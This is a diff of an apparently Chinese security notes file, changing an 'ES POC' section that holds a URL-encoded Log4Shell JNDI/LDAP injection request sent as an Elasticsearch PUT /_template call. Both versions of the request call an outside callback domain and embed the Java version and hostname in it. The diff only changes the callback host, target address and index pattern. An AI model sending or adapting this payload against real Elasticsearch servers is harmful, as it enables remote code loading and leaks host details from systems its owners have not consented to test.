@@ -21,8 +21,8 @@ unicode编码绕过：
 ## ES POC
 
 ```
-PUT /_template/%24%7bjndi%3aldap%3a%2f%2f%24%7bsys%3ajava.version%7d.%24%7bhostname%7d.accept.bugseek.coffeehb.cn%2fass%7d HTTP/1.1
-Host: 41.1.1.1:9200
+PUT /_template/%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.%24%7BhostName%7D.EXP.Log4jViaAccept.xxxx.xxxx.cn%2Fass%7D HTTP/1.1
+Host: 1.2.24:9200
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
 Content-Type: application/json;charset=UTF-8
@@ -30,9 +30,9 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 Connection: close
-Content-Length: 38
+Content-Length: 36
 
 {
-"index_patterns":["teju*","bar"]
+"index_patterns":["te*","bar"]
 }
 ```
